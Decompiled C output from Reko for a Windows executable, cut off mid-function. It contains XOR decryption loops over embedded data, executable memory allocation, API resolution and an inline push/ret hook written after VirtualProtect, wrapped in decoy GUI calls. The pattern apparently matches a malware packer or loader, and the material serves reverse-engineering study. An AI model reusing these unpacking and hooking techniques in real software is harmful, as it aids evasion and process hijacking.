// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00410000: Register word32 fn00410000(Register ptr32 ebp)
word32 fn00410000(ptr32 ebp)
{
	globals->dw43544C = 0x00430008;
	globals->dw435440 = 14565;
	globals->dw435450 = 4405488;
	globals->dw435444 = 1819;
	VirtualAlloc(0x00, 0x4000, 0x3000, 0x40);
	word32 * ebp_5 = fp - 0x04;
	int32 ebx_22 = 0x00;
	do
	{
		int32 ecx_131 = (&globals->dw435440)[ebx_22];
		Eq_149 (* edi_54)[] = (&(&globals->dw43544C)[ebx_22])[0x00];
		*(ebp_5 - 0x0C) = ecx_131;
		int32 eax_133 = 0x00;
		byte al_134 = 0x00;
		Eq_149 (* esi_135)[] = null;
		if (ecx_131 > 0x00)
		{
			do
			{
				Eq_137 cl_136 = globals->t430004;
				ecx_131 = DPB(ecx_131, cl_136, 0);
				Mem143[esi_135 + edi_54:byte] = (byte) (eax_133 + ecx_131) ^ Mem58[esi_135 + edi_54:byte] ^ cl_136 ^ al_134;
				if (eax_133 > 0x05)
				{
					eax_133 = 0x00;
					al_134 = 0x00;
				}
				else
				{
					eax_133 = eax_133 + 0x01;
					al_134 = (byte) eax_133;
				}
				esi_135 = (Eq_149 (*)[]) (esi_135 + 0x01);
			} while (esi_135 < *(ebp_5 - 0x0C));
		}
		word32 eax_115;
		word32 ecx_117;
		word32 edx_119;
		if (ebx_22 == 0x00)
		{
			eax_115 = globals->dw435440;
			ecx_117 = globals->dw43544C;
			edx_119 = *(ebp_5 - 0x08);
		}
		else
		{
			eax_115 = (&globals->dw435440)[ebx_22];
			ecx_117 = (&globals->dw43544C)[ebx_22];
			edx_119 = *(ebp_5 - 0x04) + *(ebp_5 - 0x08);
		}
		*(fp - 0x20) = eax_115;
		*(fp - 0x24) = ecx_117;
		*(fp - 0x28) = edx_119;
		word32 esi_91;
		word32 edi_92;
		word128 xmm0_93;
		ebp_5 = fn00412090(ebx_22, dwArg00, dwArg04, dwArg08, out esi_91, out edi_92, out xmm0_93);
		*(ebp_5 - 0x04) = *(ebp_5 - 0x04) + (&globals->dw435440)[ebx_22];
		ebx_22 = ebx_22 + 0x01;
	} while (ebx_22 < 0x02);
	return *(ebp_5 - 0x08);
}

// 00410120: Register word128 fn00410120(Register (ptr Eq_178) ebp, Register word128 xmm0)
word128 fn00410120(Eq_178 * ebp, word128 xmm0)
{
	if (globals->dw43400C == 0x00)
	{
		MessageBoxA(0x00, 0x004201F0, 0x004201E8, 0x00);
		&dwLoc03A8.u0->left = null;
	}
	fs->ptr0030->w00AC = 9999;
	word32 edi_44 = fn00412010(xmm0, dwLoc03A8, fp - 0x011C, 0x00, 0x9C);
	*(fp - 0x039C) = fp - 0x011C;
	if (GetVersionExA(*(fp - 0x039C)) == 0x00)
		return xmm0;
	*(fp - 0x039C) = 0x40;
	*(fp - 0x03A0) = 0x3000;
	*(fp - 0x03A4) = 0x04;
	*(fp - 0x03A8) = edi_44;
	Eq_18 eax_99 = VirtualAlloc(*(fp - 0x03A8), *(fp - 0x03A4), *(fp - 0x03A0), *(fp - 0x039C));
	*(fp - 0x039C) = (union Eq_18 *) eax_99;
	ptr32 esp_104;
	ptr32 ebp_105;
	byte SCZO_106;
	int32 ebx_107;
	struct Eq_287 * esi_108;
	uint32 edi_109;
	byte SZO_110;
	byte C_111;
	byte Z_112;
	word32 eax_113;
	struct Eq_293 * fs_114;
	word32 ecx_115;
	word32 edx_116;
	word16 ax_117;
	byte CZ_118;
	byte cl_119;
	byte dl_120;
	byte al_121;
	byte SO_122;
	word128 xmm0_123;
	IPHLPAPI.DLL!GetTcpStatistics();
	Eq_137 ecx_129 = globals->t430004;
	globals->t430004 = (word32) ecx_129.u1 - 9995 + dwLoc0110;
	globals->dw43549C = fn00410000(ebp_105) - 9999;
	if (*(ebp_105 - 0x04) == edi_109)
	{
l00410241:
		Eq_137 cl_145 = globals->t430004;
		word32 ecx_146 = DPB(ecx_129, cl_145, 0);
		int32 eax_147 = 0x00;
		byte al_149 = 0x00;
		struct Eq_341 * esi_150 = null;
		do
		{
			esi_150[0x00434010] = (struct Eq_341) ((byte) (ecx_146 + eax_147) ^ esi_150[0x00434010] ^ al_149 ^ cl_145);
			if (eax_147 > 0x05)
			{
				eax_147 = 0x00;
				al_149 = 0x00;
			}
			else
			{
				eax_147 = eax_147 + 0x01;
				al_149 = (byte) eax_147;
			}
			esi_150 = esi_150 + 0x01;
		} while (esi_150 < (struct Eq_341 *) 0x1400);
		struct Eq_471 * eax_175 = globals->ptr43404C;
		uint32 edx_176 = eax_175->dw434014;
		*(ebp_105 - 0x38) = eax_175->dw434018;
		word32 ecx_179 = eax_175->dw43401C;
		*(ebp_105 - 0x3C) = edx_176;
		*(ebp_105 - 0x34) = ecx_179;
		*(ebp_105 - 0x30) = eax_175->dw434020;
		*(ebp_105 - 44) = eax_175->dw434024;
		*(esp_104 - 0x04) = ((edx_176 >> 0x10) + (edx_176 >> 0x10) * 0x04) * 0x02 * 0x02 * 0x02;
		word32 * esi_190 = &eax_175->dw434024 + 0x01;
		word32 ecx_195 = 0x38;
		word32 * edi_197 = ebp_105 - 0x01F8;
		while (ecx_195 != 0x00)
		{
			*edi_197 = *esi_190;
			esi_190 = esi_190 + 0x01;
			edi_197 = edi_197 + 0x01;
			ecx_195 = ecx_195 - 0x01;
		}
		*(esp_104 - 0x08) = &eax_175->dw434024 + 0x0039;
		*(esp_104 - 0x0C) = ebp_105 - 0x0388;
		word32 esi_219;
		word32 edi_220;
		word128 xmm0_221;
		word32 * ebp_222 = fn00412090(ebx_107, dwArg00, dwArg04, dwArg08, out esi_219, out edi_220, out xmm0_221);
		int32 ebx_223 = *(ebp_222 - 448);
		*(esp_104 - 0x04) = 0x40;
		*(esp_104 - 0x08) = 0x3000;
		*(esp_104 - 0x0C) = ebx_223;
		*(esp_104 - 0x10) = 0x00;
		Eq_18 eax_234 = VirtualAlloc(*(esp_104 - 0x10), *(esp_104 - 0x0C), *(esp_104 - 0x08), *(esp_104 - 0x04));
		*(esp_104 - 0x04) = *(ebp_222 - 884);
		*(esp_104 - 0x08) = 0x00434010;
		*(esp_104 - 0x0C) = (union Eq_18 *) eax_234;
		word32 edi_245;
		word128 xmm0_246;
		word32 esi_244;
		word32 * ebp_247 = fn00412090(ebx_223, dwArg00, dwArg04, dwArg08, out esi_244, out edi_245, out xmm0_246);
		int32 eax_248 = (word32) *(ebp_247 - 0x3A);
		if (eax_248 > 0x00)
		{
			*(ebp_247 - 0x08) = eax_248;
			word32 * edi_343 = ebp_247 - 884;
			do
			{
				word32 ecx_350 = *edi_343;
				word32 edx_351 = *(edi_343 - 0x08);
				*(esp_104 - 0x04) = *(edi_343 - 0x04);
				*(esp_104 - 0x08) = ecx_350 + 0x00434010;
				*(esp_104 - 0x0C) = edx_351 + esi_244;
				word32 edi_362;
				ebp_247 = fn00412090(ebx_223, dwArg00, dwArg04, dwArg08, out esi_244, out edi_362, out xmm0_246);
				word32 v22_368 = *(ebp_247 - 0x08) - 0x01;
				*(ebp_247 - 0x08) = v22_368;
				edi_343 = edi_362 + 0x28;
			} while (v22_368 != 0x00);
		}
		byte cl_260 = globals->b42020A;
		*(ebp_247 - 0x18) = globals->w420208;
		*(esp_104 - 0x04) = 0x0042020C;
		*(esp_104 - 0x08) = ebp_247 - 0x18;
		*(ebp_247 - 22) = cl_260;
		*(ebp_247 - 0x15) = 0x00;
		*(ebp_247 - 0x11) = 0x00;
		*(ebp_247 - 0x0D) = 0x00;
		*(ebp_247 - 0x09) = 0x00;
		lstrcatA(*(esp_104 - 0x08), *(esp_104 - 0x04));
		*(esp_104 - 0x04) = 0x00420210;
		*(esp_104 - 0x08) = ebp_247 - 0x18;
		lstrcatA(*(esp_104 - 0x08), *(esp_104 - 0x04));
		word32 eax_283 = *(ebp_247 - 444);
		*(esp_104 - 0x04) = ebp_247 - 0x18;
		word32 ebx_284 = ebx_223 - eax_283;
		*(esp_104 - 0x08) = ebx_284 + 0x01;
		word32 ebx_293;
		ptr32 ebp_294;
		word32 esi_295;
		word32 eax_296 = fn00411600(eax_283 + esi_244, ebx_284 + 0x01, ebp_247, ebp, dwArg00, dwArg04, out ebx_293, out ebp_294, out esi_295);
		word32 ecx_297 = globals->dw43549C;
		if (*(ebp_294 - 0x04) != 0x00)
			ecx_297 = ecx_297 + 0x02D5;
		word32 ecx_305 = ecx_297 + *(ebp_294 - 0x010C);
		*(esp_104 - 0x04) = ecx_305;
		*(esp_104 - 0x08) = 0x00420214;
		*(esp_104 - 0x0C) = ebp_294 - 0x28;
		globals->dw43549C = ecx_305;
		*(ebp_294 - 0x28) = 0x00;
		*(ebp_294 - 0x27) = 0x00;
		*(ebp_294 - 0x23) = 0x00;
		*(ebp_294 - 0x1F) = 0x00;
		*(ebp_294 - 0x1B) = 0x00;
		*(ebp_294 - 0x19) = 0x00;
		wsprintfA(*(esp_104 - 0x0C), *(esp_104 - 0x08), *(esp_104 - 0x04));
		*(esp_104 - 0x04) = ebp_294 - 0x28;
		*(esp_104 - 0x08) = eax_296;
		lstrcpyA(*(esp_104 - 0x08), *(esp_104 - 0x04));
		*(esp_104 - 0x04) = esi_295;
		fn00411550(ebx_293, ebp_294, ebp, dwArg00, dwArg04);
		*(ebp_294 - 0x08) = esi_295 + *(ebp_294 - 488);
		*(esp_104 - 0x04) = *(ebp_294 - 0x08);
		return xmm0_246;
	}
	Eq_343 edx_410;
	Eq_18 eax_381 = GetForegroundWindow();
	*(esp_104 - 0x04) = ebp_105 - 0x7C;
	*(esp_104 - 0x08) = (union Eq_18 *) eax_381;
	Eq_360 eax_388 = BeginPaint(*(esp_104 - 0x08), *(esp_104 - 0x04));
	ecx_129 = globals->t435498;
	if (ecx_129 == 0x01)
		edx_410 = globals->t435448;
	else
	{
		if (ecx_129 != 0x02)
			goto l00410236;
		edx_410 = globals->t435468;
	}
	*(esp_104 - 0x04) = (HBRUSH *) edx_410;
	*(esp_104 - 0x08) = ebp_105 - 116;
	*(esp_104 - 0x0C) = (HDC *) eax_388;
	FillRect(*(esp_104 - 0x0C), *(esp_104 - 0x08), *(esp_104 - 0x04));
	ecx_129 = ebp_105 - 116;
l00410236:
	*(esp_104 - 0x04) = ebp_105 - 0x7C;
	*(esp_104 - 0x08) = (union Eq_18 *) eax_381;
	EndPaint(*(esp_104 - 0x08), *(esp_104 - 0x04));
	goto l00410241;
}

// 00410920: Register Eq_18 Win32CrtStartup()
Eq_18 Win32CrtStartup()
{
	ptr32 eax_14 = fs->ptr0000;
	fs->ptr0000 = fp - 0x14;
	Eq_1025 eax_36 = CreateMutexA(null, 0x01, 0x00420224);
	CloseHandle(CreateFileW(&globals->t420230, 0x40000000, 0x03, null, 0x03, 0x00, 0x00));
	struct Eq_178 * ebp_205 = fp - 0x04;
	globals->dw435454 = 0x00;
	globals->dw435458 = 0x00;
	globals->dw43545C = 0x00;
	globals->dw435460 = 0x00;
	globals->dw435464 = 0x00;
	fn00412010(xmm0, 0x00, fp - 0x9C, 0x00, 44);
	*(fp - 424) = 0x7F00;
	*(fp - 0x01AC) = 0x00;
	LoadIconA(*(fp - 0x01AC), *(fp - 424));
	*(fp - 424) = 0x7F00;
	*(fp - 0x01AC) = 0x00;
	LoadIconA(*(fp - 0x01AC), *(fp - 424));
	*(fp - 424) = 0x7F00;
	*(fp - 0x01AC) = 0x00;
	Eq_1143 eax_113 = LoadCursorA(*(fp - 0x01AC), *(fp - 424));
	*(fp - 424) = fp - 0xA0;
	Eq_1165 eax_124 = DPB(eax_113, RegisterClassExA(*(fp - 424)), 0);
	word32 ebx_304 = dwArg04;
	if (RegisterClassExA(*(fp - 424)) != 0x00)
	{
		*(fp - 424) = 0x00;
		*(fp - 0x01AC) = dwArg04;
		*(fp - 0x01B0) = 0x00;
		*(fp - 0x01B4) = 0x00;
		*(fp - 440) = 0x0F;
		*(fp - 444) = 0x0F;
		*(fp - 448) = 0x80000000;
		*(fp - 0x01C4) = 0x80000000;
		*(fp - 0x01C8) = 0x000A0000;
		*(fp - 0x01CC) = 0x00420244;
		*(fp - 464) = 0x00420240;
		*(fp - 0x01D4) = 0x0200;
		Eq_18 eax_244 = CreateWindowExA(*(fp - 0x01D4), *(fp - 464), *(fp - 0x01CC), *(fp - 0x01C8), *(fp - 0x01C4), *(fp - 448), *(fp - 444), *(fp - 440), *(fp - 0x01B4), *(fp - 0x01B0), *(fp - 0x01AC), *(fp - 424));
		*(fp - 424) = 0x05;
		*(fp - 0x01AC) = (union Eq_18 *) eax_244;
		ShowWindow(*(fp - 0x01AC), *(fp - 424));
		if (eax_36 == 0x00)
		{
			*(fp - 424) = 0x00;
			*(fp - 0x01AC) = 0x00;
			*(fp - 0x01B0) = 0x00;
			*(fp - 0x01B4) = fp - 0x48;
			if (GetMessageA(*(fp - 0x01B4), *(fp - 0x01B0), *(fp - 0x01AC), *(fp - 424)) != 0x00)
			{
				do
				{
					*(fp - 424) = fp - 0x48;
					TranslateMessage(*(fp - 424));
					*(fp - 424) = fp - 0x48;
					DispatchMessageA(*(fp - 424));
					*(fp - 424) = 0x00;
					*(fp - 0x01AC) = 0x00;
					*(fp - 0x01B0) = 0x00;
					*(fp - 0x01B4) = fp - 0x48;
				} while (GetMessageA(*(fp - 0x01B4), *(fp - 0x01B0), *(fp - 0x01AC), *(fp - 424)) != 0x00);
			}
			*(fp - 424) = 0x00;
			CloseHandle(*(fp - 424));
			fs->ptr0000 = eax_14;
			return 0x00;
		}
		*(fp - 424) = (union Eq_18 *) eax_244;
		DestroyWindow(*(fp - 424));
		*(fp - 424) = fp - 0x0198;
		GetStartupInfoW(*(fp - 424));
		*(fp - 424) = 0x00;
		*(fp - 0x01AC) = 0x00;
		*(fp - 0x01B0) = 0x03;
		*(fp - 0x01B4) = 0x00;
		*(fp - 440) = 0x03;
		*(fp - 444) = 0x80000000;
		*(fp - 448) = 0x00420258;
		Eq_1025 eax_277 = CreateFileW(*(fp - 448), *(fp - 444), *(fp - 440), *(fp - 0x01B4), *(fp - 0x01B0), *(fp - 0x01AC), *(fp - 424));
		ptr32 esp_279 = fp - 0x01A4;
		if (eax_277 != ~0x00)
		{
			*(fp - 424) = (union Eq_1025 *) eax_277;
			CloseHandle(*(fp - 424));
			*(fp - 424) = 0x00;
			ptr32 esp_1073 = fp - 0x01A4;
			if (CoInitialize(*(fp - 424)) == 0x00)
			{
				*(fp - 424) = fp - 0x24;
				*(fp - 0x01AC) = 0x00420198;
				*(fp - 0x01B0) = 0x01;
				*(fp - 0x01B4) = 0x00;
				*(fp - 440) = 0x004201A8;
				esp_1073 = fp - 0x01A4;
				if (CoCreateInstance(*(fp - 440), *(fp - 0x01B4), *(fp - 0x01B0), *(fp - 0x01AC), *(fp - 424)) >= 0x00)
				{
					struct Eq_2017 * ecx_956 = *dwLoc24;
					*(fp - 424) = 0x00420284;
					*(fp - 0x01AC) = (struct Eq_2017 ***) dwLoc24;
					<anonymous> * edx_961 = ecx_956->ptr0050;
					word32 ebp_963;
					int32 eax_964;
					struct Eq_2039 * fs_965;
					byte SCZO_966;
					word32 ebx_967;
					word32 esi_968;
					word32 edi_969;
					byte SZO_970;
					byte C_971;
					word32 ecx_972;
					word16 ax_973;
					byte Z_974;
					word32 edx_975;
					byte S_976;
					byte dl_977;
					word16 cx_978;
					word16 dx_979;
					word128 xmm0_980;
					edx_961();
					if (eax_964 >= 0x00)
					{
						struct Eq_2017 * ecx_985 = *dwLoc24;
						*(esp_1073 - 0x04) = fp - 0x20;
						*(esp_1073 - 0x08) = 0x004201B8;
						*(esp_1073 - 0x0C) = (struct Eq_2017 ***) dwLoc24;
						<anonymous> * eax_993 = ecx_985->ptr0000;
						word32 ebp_995;
						int32 eax_996;
						struct Eq_2085 * fs_997;
						byte SCZO_998;
						word32 ebx_999;
						word32 esi_1000;
						word32 edi_1001;
						byte SZO_1002;
						byte C_1003;
						word32 ecx_1004;
						word16 ax_1005;
						byte Z_1006;
						word32 edx_1007;
						byte S_1008;
						byte dl_1009;
						word16 cx_1010;
						word16 dx_1011;
						word128 xmm0_1012;
						eax_993();
						if (eax_996 >= 0x00)
						{
							struct Eq_2103 * ecx_1017 = *eax_36;
							*(esp_1073 - 0x04) = 0x00;
							*(esp_1073 - 0x08) = 0x00420278;
							*(esp_1073 - 0x0C) = (union Eq_1025 *) eax_36;
							<anonymous> * edx_1024 = ecx_1017->ptr0018;
							ptr32 esp_1025;
							word32 ebp_1026;
							word32 eax_1027;
							struct Eq_2131 * fs_1028;
							byte SCZO_1029;
							word32 ebx_1030;
							word32 esi_1031;
							word32 edi_1032;
							byte SZO_1033;
							byte C_1034;
							word32 ecx_1035;
							word16 ax_1036;
							byte Z_1037;
							word32 edx_1038;
							byte S_1039;
							byte dl_1040;
							word16 cx_1041;
							word16 dx_1042;
							word128 xmm0_1043;
							edx_1024();
							struct Eq_2103 * ecx_1045 = *eax_36;
							*(esp_1025 - 0x04) = (union Eq_1025 *) eax_36;
							<anonymous> * edx_1048 = ecx_1045->ptr0008;
							ptr32 esp_1049;
							word32 ebp_1050;
							word32 eax_1051;
							struct Eq_2163 * fs_1052;
							byte SCZO_1053;
							word32 ebx_1054;
							word32 esi_1055;
							word32 edi_1056;
							byte SZO_1057;
							byte C_1058;
							word32 ecx_1059;
							word16 ax_1060;
							byte Z_1061;
							word32 edx_1062;
							byte S_1063;
							byte dl_1064;
							word16 cx_1065;
							word16 dx_1066;
							word128 xmm0_1067;
							edx_1048();
							struct Eq_2017 * ecx_1069 = *dwLoc24;
							*(esp_1049 - 0x04) = (struct Eq_2017 ***) dwLoc24;
							<anonymous> * edx_1072 = ecx_1069->ptr0008;
							word32 ebp_1074;
							word32 eax_1075;
							struct Eq_2194 * fs_1076;
							byte SCZO_1077;
							word32 ebx_1078;
							word32 esi_1079;
							word32 edi_1080;
							byte SZO_1081;
							byte C_1082;
							word32 ecx_1083;
							word16 ax_1084;
							byte Z_1085;
							word32 edx_1086;
							byte S_1087;
							byte dl_1088;
							word16 cx_1089;
							word16 dx_1090;
							word128 xmm0_1091;
							edx_1072();
							CoUninitialize();
						}
					}
				}
			}
			union Eq_18 * esp_794 = esp_1073 - 0x04;
			*esp_794 = (union Eq_18 *) 0x00;
			*(esp_794 - 0x04) = 0x00420298;
			*(esp_794 - 0x08) = 0x004202A0;
			*(esp_794 - 0x0C) = 0x00;
			MessageBoxA(*(esp_794 - 0x0C), *(esp_794 - 0x08), *(esp_794 - 0x04), *esp_794);
			*esp_794 = (union Eq_18 *) 0x7F00;
			*(esp_794 - 0x04) = 0x00;
			LoadCursorA(*(esp_794 - 0x04), *esp_794);
			*(esp_821 - 0x04) = fp - 0x70;
			ptr32 eax_847 = DPB(fp - 0x70, RegisterClassA(*(esp_821 - 0x04)), 0);
			*(esp_821 - 0x04) = 0x00;
			*(esp_821 - 0x08) = ebx_304;
			*(esp_821 - 0x0C) = 0x00;
			*(esp_821 - 0x10) = 0x00;
			*(esp_821 - 0x14) = 0x01E0;
			*(esp_821 - 0x18) = 500;
			*(esp_821 - 0x1C) = 0x3C;
			*(esp_821 - 0x20) = 100;
			*(esp_821 - 0x24) = 0x80000000;
			*(esp_821 - 0x28) = 0x004202C0;
			*(esp_821 - 44) = 0x004202B8;
			*(esp_821 - 0x30) = 0x00;
			Eq_18 eax_874 = CreateWindowExA(*(esp_821 - 0x30), *(esp_821 - 44), *(esp_821 - 0x28), *(esp_821 - 0x24), *(esp_821 - 0x20), *(esp_821 - 0x1C), *(esp_821 - 0x18), *(esp_821 - 0x14), *(esp_821 - 0x10), *(esp_821 - 0x0C), *(esp_821 - 0x08), *(esp_821 - 0x04));
			*(esp_821 - 0x04) = 0x05;
			*(esp_821 - 0x08) = (union Eq_18 *) eax_874;
			ShowWindow(*(esp_821 - 0x08), *(esp_821 - 0x04));
			*(esp_821 - 0x04) = (union Eq_18 *) eax_874;
			UpdateWindow(*(esp_821 - 0x04));
			*(esp_821 - 0x04) = 0x00;
			*(esp_821 - 0x08) = 0x004201E8;
			*(esp_821 - 0x0C) = 0x00430000;
			*(esp_821 - 0x10) = 0x00;
			MessageBoxA(*(esp_821 - 0x10), *(esp_821 - 0x0C), *(esp_821 - 0x08), *(esp_821 - 0x04));
			*(esp_821 - 0x04) = 0x00;
			*(esp_821 - 0x08) = 0x00;
			*(esp_821 - 0x0C) = 0x00;
			*(esp_821 - 0x10) = fp - 0x0108;
			esp_279 = esp_821;
			if (GetMessageA(*(esp_821 - 0x10), *(esp_821 - 0x0C), *(esp_821 - 0x08), *(esp_821 - 0x04)) != 0x00)
			{
				do
				{
					*(esp_821 - 0x04) = fp - 0x0108;
					TranslateMessage(*(esp_821 - 0x04));
					*(esp_821 - 0x04) = fp - 0x0108;
					DispatchMessageA(*(esp_821 - 0x04));
					*(esp_821 - 0x04) = 0x00;
					*(esp_821 - 0x08) = 0x00;
					*(esp_821 - 0x0C) = 0x00;
					*(esp_821 - 0x10) = fp - 0x0108;
					esp_279 = esp_821;
				} while (GetMessageA(*(esp_821 - 0x10), *(esp_821 - 0x0C), *(esp_821 - 0x08), *(esp_821 - 0x04)) != 0x00);
			}
		}
		union Eq_18 * esp_307 = esp_279 - 0x04;
		*esp_307 = (union Eq_18 *) 0x40;
		*(esp_307 - 0x04) = 0x3000;
		*(esp_307 - 0x08) = 0x1000;
		*(esp_307 - 0x0C) = 0x00;
		Eq_18 eax_315 = VirtualAlloc(*(esp_307 - 0x0C), *(esp_307 - 0x08), *(esp_307 - 0x04), *esp_307);
		if (eax_315 == 0x00)
		{
			GetForegroundWindow();
			*esp_307 = (union Eq_18 *) 0x0064FF64;
			globals->t435468 = CreateSolidBrush(*esp_307);
			*esp_307 = (union Eq_18 *) 0x006464FF;
			globals->t435448 = CreateSolidBrush(*esp_307);
			*esp_307 = (union Eq_18 *) 0x3C;
			*(esp_307 - 0x04) = 0x00;
			*(esp_307 - 0x08) = fp - 0x0144;
			word32 edi_632 = fn00412010(xmm0, ebp, dwArg00, dwArg04, dwArg08);
			Eq_2588 eax_634 = 0x00;
			do
			{
				int32 ecx_660 = eax_634 * 0x05 * 0x02 * 0x02;
				Mem661[fp - 0x013C + ecx_660:byte] = 0x04;
				(fp - 0x0144)[ecx_660 / 0x04] = eax_634;
				eax_634 = (word32) eax_634.u0 + 0x01;
			} while (eax_634 < 0x03);
			*esp_307 = (union Eq_18 *) 0x14;
			*(esp_307 - 0x04) = 0x10;
			*(esp_307 - 0x08) = 0x10;
			*(esp_307 - 0x0C) = 0x10;
			*(esp_307 - 0x10) = 0x10;
			*(esp_307 - 0x14) = 0x03;
			*(esp_307 - 0x18) = fp - 0x0144;
			*(esp_307 - 0x1C) = 0x02;
			*(esp_307 - 0x20) = globals->dw435488;
			*(esp_307 - 0x24) = 0x03;
			*(esp_307 - 0x28) = ~0x00;
			*(esp_307 - 44) = 0x50800000;
			*(esp_307 - 0x30) = edi_632;
			CreateToolbarEx(*(esp_307 - 0x30), *(esp_307 - 44), *(esp_307 - 0x28), *(esp_307 - 0x24), *(esp_307 - 0x20), *(esp_307 - 0x1C), *(esp_307 - 0x18), *(esp_307 - 0x14), *(esp_307 - 0x10), *(esp_307 - 0x0C), *(esp_307 - 0x08), *(esp_307 - 0x04), *esp_307);
			if (eax_315 == 0x00)
			{
				Eq_18 eax_701 = GetForegroundWindow();
				Eq_1275 eax_703 = CreatePopupMenu();
				*esp_307 = (union Eq_18 *) 4325832;
				*(esp_307 - 0x04) = 0x01;
				*(esp_307 - 0x08) = 0x00;
				*(esp_307 - 0x0C) = (HMENU *) eax_703;
				AppendMenuA(*(esp_307 - 0x0C), *(esp_307 - 0x08), *(esp_307 - 0x04), *esp_307);
				*esp_307 = (union Eq_18 *) 4325844;
				*(esp_307 - 0x04) = 0x02;
				*(esp_307 - 0x08) = 0x00;
				*(esp_307 - 0x0C) = (HMENU *) eax_703;
				AppendMenuA(*(esp_307 - 0x0C), *(esp_307 - 0x08), *(esp_307 - 0x04), *esp_307);
				*esp_307 = (union Eq_18 *) 0x00;
				*(esp_307 - 0x04) = 0x00;
				*(esp_307 - 0x08) = 0x0800;
				*(esp_307 - 0x0C) = (HMENU *) eax_703;
				AppendMenuA(*(esp_307 - 0x0C), *(esp_307 - 0x08), *(esp_307 - 0x04), *esp_307);
				*esp_307 = (union Eq_18 *) 0x004201E0;
				*(esp_307 - 0x04) = 0x03;
				*(esp_307 - 0x08) = 0x00;
				*(esp_307 - 0x0C) = (HMENU *) eax_703;
				AppendMenuA(*(esp_307 - 0x0C), *(esp_307 - 0x08), *(esp_307 - 0x04), *esp_307);
				*esp_307 = (union Eq_18 *) (fp - 0x0154);
				*(esp_307 - 0x04) = (union Eq_18 *) eax_701;
				GetWindowRect(*(esp_307 - 0x04), *esp_307);
				*esp_307 = (union Eq_18 *) 0x00;
				*(esp_307 - 0x04) = (union Eq_18 *) eax_701;
				*(esp_307 - 0x08) = 0x00;
				*(esp_307 - 0x0C) = globals->dw435484;
				*(esp_307 - 0x10) = globals->dw435480;
				*(esp_307 - 0x14) = 0x00;
				*(esp_307 - 0x18) = (HMENU *) eax_703;
				TrackPopupMenu(*(esp_307 - 0x18), *(esp_307 - 0x14), *(esp_307 - 0x10), *(esp_307 - 0x0C), *(esp_307 - 0x08), *(esp_307 - 0x04), *esp_307);
				ebx_304 = dwArg04;
			}
		}
		union Eq_18 * esp_327 = esp_279 - 0x04;
		*esp_327 = (union Eq_18 *) 0x50;
		Sleep(*esp_327);
		word128 xmm0_330 = fn00410120(ebp_205, xmm0);
		*(ebp_205 - 0x28) = globals->dw4202D4;
		*(ebp_205 - 0x24) = globals->w4202D8;
		*(ebp_205 - 0x22) = globals->b4202DA;
		*esp_327 = (union Eq_18 *) 44;
		*(esp_327 - 0x04) = 0x00;
		*(esp_327 - 0x08) = ebp_205 - 228;
		fn00412010(xmm0_330, ebp, dwArg00, dwArg04, dwArg08);
		*(ebp_205 - 232) = 0x30;
		*(ebp_205 - 0xE0) = 0x00411070;
		*(ebp_205 - 212) = ebx_304;
		*esp_327 = (union Eq_18 *) 0x8000;
		*(esp_327 - 0x04) = 0x00;
		*(esp_327 - 0x08) = 0x00;
		*(esp_327 - 0x0C) = 0x01;
		*(esp_327 - 0x10) = 0x7F04;
		*(esp_327 - 0x14) = 0x00;
		*(ebp_205 - 0xD0) = (union Eq_1025 *) LoadImageA(*(esp_327 - 0x14), *(esp_327 - 0x10), *(esp_327 - 0x0C), *(esp_327 - 0x08), *(esp_327 - 0x04), *esp_327);
		*esp_327 = (union Eq_18 *) 0x8000;
		*(esp_327 - 0x04) = 0x00;
		*(esp_327 - 0x08) = 0x00;
		*(esp_327 - 0x0C) = 0x02;
		*(esp_327 - 0x10) = 0x7F00;
		*(esp_327 - 0x14) = 0x00;
		Eq_1025 eax_379 = LoadImageA(*(esp_327 - 0x14), *(esp_327 - 0x10), *(esp_327 - 0x0C), *(esp_327 - 0x08), *(esp_327 - 0x04), *esp_327);
		*(ebp_205 - 0xCC) = (union Eq_1025 *) eax_379;
		*(ebp_205 - 200) = 0x10;
		*(ebp_205 - 0xC0) = ebp_205 - 0x28;
		*esp_327 = (union Eq_18 *) (ebp_205 - 232);
		Eq_2529 eax_388 = DPB(eax_379, RegisterClassExA(*esp_327), 0);
		if (RegisterClassExA(*esp_327) == 0x00)
		{
			*esp_327 = (union Eq_18 *) 0x10;
			*(esp_327 - 0x04) = 0x00420298;
			*(esp_327 - 0x08) = 0x00420314;
			*(esp_327 - 0x0C) = 0x00;
			MessageBoxA(*(esp_327 - 0x0C), *(esp_327 - 0x08), *(esp_327 - 0x04), *esp_327);
			fs->ptr0000 = *(ebp_205 - 0x10);
			return 0x00;
		}
		*esp_327 = (union Eq_18 *) 0x00;
		*(esp_327 - 0x04) = ebx_304;
		*(esp_327 - 0x08) = 0x00;
		*(esp_327 - 0x0C) = 0x00;
		*(esp_327 - 0x10) = 0xB2;
		*(esp_327 - 0x14) = 0x0116;
		*(esp_327 - 0x18) = 0x00;
		*(esp_327 - 0x1C) = 0x00;
		*(esp_327 - 0x20) = 0x00CA0000;
		*(esp_327 - 0x24) = 0x004202DC;
		*(esp_327 - 0x28) = ebp_205 - 0x28;
		*(esp_327 - 44) = 0x00;
		Eq_18 eax_419 = CreateWindowExA(*(esp_327 - 44), *(esp_327 - 0x28), *(esp_327 - 0x24), *(esp_327 - 0x20), *(esp_327 - 0x1C), *(esp_327 - 0x18), *(esp_327 - 0x14), *(esp_327 - 0x10), *(esp_327 - 0x0C), *(esp_327 - 0x08), *(esp_327 - 0x04), *esp_327);
		if (eax_419 != 0x00)
		{
			fn00411340(eax_419);
			*esp_327 = (union Eq_18 *) 0x004202E8;
			*(esp_327 - 0x04) = 0x004202F4;
			*(esp_327 - 0x04) = (HMODULE *) GetModuleHandleA(*(esp_327 - 0x04));
			Eq_3298 eax_433 = GetProcAddress(*(esp_327 - 0x04), *esp_327);
			globals->t435494 = eax_433;
			if (eax_433 != 0x00)
			{
				globals->t43548C = *eax_433;
				globals->w435490 = (word16) *((word32) eax_433 + 0x04);
			}
			*esp_327 = (union Eq_18 *) 0x004354A0;
			*(esp_327 - 0x04) = 0x40;
			*(esp_327 - 0x08) = 0x06;
			*(esp_327 - 0x0C) = (union Eq_3298 *) eax_433;
			VirtualProtect(*(esp_327 - 0x0C), *(esp_327 - 0x08), *(esp_327 - 0x04), *esp_327);
			Eq_3298 eax_452 = globals->t435494;
			*eax_452 = 0x68;
			*((word32) eax_452 + 0x01) = 0x004100F0;
			*((word32) eax_452 + 0x05) = 0xC3;
			*esp_327 = (union Eq_18 *) ebp_205->t0014;
			*(esp_327 - 0x04) = (union Eq_18 *) eax_419;
